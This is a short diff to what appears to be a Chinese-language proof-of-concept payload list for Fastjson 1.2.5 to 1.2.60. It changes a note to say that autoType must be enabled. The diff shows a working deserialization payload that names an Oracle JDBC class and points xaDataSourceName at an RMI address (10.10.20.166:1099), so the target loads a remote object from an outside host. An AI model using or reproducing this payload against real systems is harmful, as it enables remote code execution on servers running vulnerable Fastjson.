@@ -1138,7 +1138,7 @@ poc:
 
 ### Fastjson1.2.5 <= 1.2.60
 
-**无需开启 autoType：**
+**需开启 autoType：**
 
 ```shell
 {"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}
